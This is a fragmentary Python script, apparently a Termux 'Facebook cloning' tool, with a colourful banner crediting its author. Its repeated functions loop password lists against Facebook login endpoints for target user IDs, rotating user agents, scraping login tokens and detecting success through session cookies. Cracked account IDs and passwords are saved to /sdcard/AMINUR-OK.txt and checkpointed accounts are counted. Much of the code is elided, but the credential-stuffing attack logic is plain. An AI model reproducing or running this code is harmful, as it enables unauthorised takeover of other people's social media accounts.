...
██ 
 ...
 \033[38;5;6m╔════════════════════════════════════════════════╗
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;146m AMINUR RAHMAN    \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;146m MD AMINUR RAHMAN                \033[38;5;6m║
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;146m FUCK                \033[38;5;6m║
 ...
 \033[38;5;6m║     \033[38;5;195m[\033[38;5;45m✓\033[38;5;195m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;146mFUCK                    \033[38;5;6m║
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m AMINUR TERMUX HELPING ZONE....
 \033[38;5;6m══════════════════════════════════════════════════
    """)
...
def fuck():
    ...
    #print(' [✓] Ids saved in AMINUR-OK.txt,-CP.txt')
    #print(balpakna)
    
#_____[M1 P-Facebook]______#
def AMINUR(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M1\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'x-response-format': 'JSONStream',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[AMINUR-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                ...
                open('/sdcard/AMINUR-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[AMINUR-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-🤙] {cid} - {ids} ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                #open('/sdcard/AMINUR-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def XUDI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M2\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
...
def SORNA(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M3\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def XXX(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M4\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def SATTAR(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M5\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def MUNNI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mAMINUR-M6\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
